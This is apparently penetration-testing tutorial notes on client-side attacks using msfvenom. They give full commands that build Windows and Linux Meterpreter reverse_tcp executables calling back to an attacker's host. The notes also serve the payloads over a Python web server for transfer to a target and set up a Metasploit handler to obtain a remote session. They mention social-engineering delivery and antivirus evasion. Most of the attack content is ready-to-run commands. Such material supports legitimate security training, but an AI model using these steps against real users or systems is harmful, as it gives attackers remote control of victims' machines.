# Payloads

## Generating Payloads with Msfvenom

### Client-Side Attacks

- **Definition**: A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system, which then connects back to the attacker when executed.
- **Techniques**: These attacks typically utilize social engineering techniques to generate malicious documents or portable executables (PEs).
- **Vulnerability**: Client-side attacks exploit human vulnerabilities as opposed to vulnerabilities in services or software running on the target system.
- **Antivirus Considerations**: Since this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be mindful of AV detection.

### Msfvenom

- **What is Msfvenom?**: Msfvenom is a command-line utility used to generate and encode Metasploit Framework (MSF) payloads for various operating systems and web servers.
- **Origin**: Msfvenom combines the functionalities of two tools: `msfpayload` and `msfencode`.
- **Purpose**: We can use Msfvenom to generate a malicious Meterpreter payload that can be transferred to a target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

### Demo: Generating Payloads with Msfvenom

1. **List available payloads:**

    ```bash
    msfvenom --list payloads
    ```

2. **Types of Payloads:**
   - **Staged Payload**: Delivered in two parts: an initial loader that connects back to the attacker and downloads the main payload, allowing for smaller payloads and flexibility.
   - **Non-staged Payload**: Delivers the entire payload at once, making it simpler and faster but potentially larger in size.

#### Generating Windows Payloads

- **Generate x86 Payload:**

    ```bash
    msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe
    ```

    Check if the payload was generated successfully:

    ```bash
    cd Desktop/Windows_Payloads/
    ls
    ```

- **Generate x64 Payload:**

    ```bash
    msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f exe > /home/kali/Desktop/Windows_Payloads/payloadx64.exe
    ```

    Verify:

    ```bash
    cd Desktop/Windows_Payloads/
    ls
    ```

- **Set up a Handler:**
    - A handler is needed to listen for and manage incoming connections from the payload on the target machine, enabling control over the compromised system:

    ```bash
    use exploit/multi/handler
    ```

- **List available output formats:**

    ```bash
    msfvenom -list formats
    ```

    - **Framework Executable Formats**: aspx, dll, elf, exe, jar, etc.
    - **Framework Transform Formats**: Allows us to output the payloads into a Python, Ruby file, etc.

#### Generating Linux Payloads

- **Navigate to the directory for Linux payloads:**

    ```bash
    cd ..
    ls
    ```

    The payloads will be stored in `/home/kali/Desktop/`.

- **Generate Payload:**

    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[yourIP] LPORT=[port] -f elf > /Desktop/Linux_Payloads/payloadx86
    ```

    Navigate to the target directory and make the payload executable:

    ```bash
    cd Linux_Payloads/
    chmod +x payloadx86
    ./payloadx86
    ```

### Transfer Windows Payload onto Target System

- **Navigate to the Windows payloads directory:**

    ```bash
    cd Windows_Payloads/
    ```

- **Set up a simple web server to host the payload files:**

    ```bash
    sudo python -m SimpleHTTPServer 80
    ```

- **Open a new tab and launch msfconsole:**

    ```bash
    msfconsole
    ```

    - **Set up and run the handler:**

        ```bash
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
        set lhost [yourIP]
        set lport [port]
        run
        ```

    - **Result**: We obtained a Meterpreter session.
